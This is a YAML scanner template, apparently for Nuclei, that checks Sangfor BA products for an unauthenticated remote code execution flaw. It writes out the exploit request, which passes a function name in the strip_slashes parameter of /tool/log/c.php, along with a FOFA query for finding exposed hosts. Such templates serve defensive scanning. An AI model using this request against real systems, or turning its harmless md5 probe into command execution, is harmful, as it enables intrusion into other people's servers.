id: sangfor-ba-rce
info:
  name: Sangfor BA - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: |
    Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands.
  reference:
    - https://mobile.twitter.com/sec715/status/1406886851072253953
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77,CWE-78
  metadata:
    runzero-review: REJECT/2025-11-07/excluding tag intrusive
    fofa-query: app="sangfor"
    max-request: 1
    verified: true
  tags: intrusive,rce,sangfor,vuln
http:
  - matchers:
      - part: body
        type: word
        words:
          - '{{md5("{{randstr}}")}}'
      - status:
          - 200
        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}'
